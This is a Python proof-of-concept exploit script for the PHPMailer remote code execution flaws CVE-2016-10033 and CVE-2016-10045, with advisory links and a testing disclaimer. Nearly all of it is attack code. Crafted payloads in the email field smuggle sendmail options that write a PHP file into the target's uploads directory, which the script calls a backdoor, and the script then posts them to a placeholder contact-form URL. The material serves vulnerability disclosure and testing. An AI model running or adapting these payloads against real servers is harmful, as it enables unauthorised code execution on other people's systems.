#!/usr/bin/python

intro = """
PHPMailer RCE PoC Exploits

PHPMailer < 5.2.18 Remote Code Execution PoC Exploit (CVE-2016-10033)
+
PHPMailer < 5.2.20 Remote Code Execution PoC Exploit (CVE-2016-10045)
(the bypass of the first patch for CVE-2016-10033)

Discovered and Coded by:

 Dawid Golunski
 @dawid_golunski
 https://legalhackers.com

"""
usage = """
Usage:

Full Advisory:
https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html

https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10045-Vuln-Patch-Bypass.html

PoC Video:
https://legalhackers.com/videos/PHPMailer-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10033-PoC.html

Disclaimer:
For testing purposes only. Do no harm.

"""

import time
import urllib
import urllib2
import socket
import sys

RW_DIR = "/var/www/html/uploads"

url = 'http://VictimWebServer/contact_form.php' # Set destination URL here

# Choose/uncomment one of the payloads:

# PHPMailer < 5.2.18 Remote Code Execution PoC Exploit (CVE-2016-10033)
#payload = '"attacker\\" -oQ/tmp/ -X%s/phpcode.php  some"@email.com' % RW_DIR

# Bypass / PHPMailer < 5.2.20 Remote Code Execution PoC Exploit (CVE-2016-10045)
payload = "\"attacker\\' -oQ/tmp/ -X%s/phpcode.php  some\"@email.com" % RW_DIR

######################################

# PHP code to be saved into the backdoor php file on the target in RW_DIR
RCE_PHP_CODE = "<?php phpinfo(); ?>"

post_fields = {'action': 'send', 'name': 'Jas Fasola', 'email': payload, 'msg': RCE_PHP_CODE}

# Attack
data = urllib.urlencode(post_fields)
req = urllib2.Request(url, data)
response = urllib2.urlopen(req)
the_page = response.read()

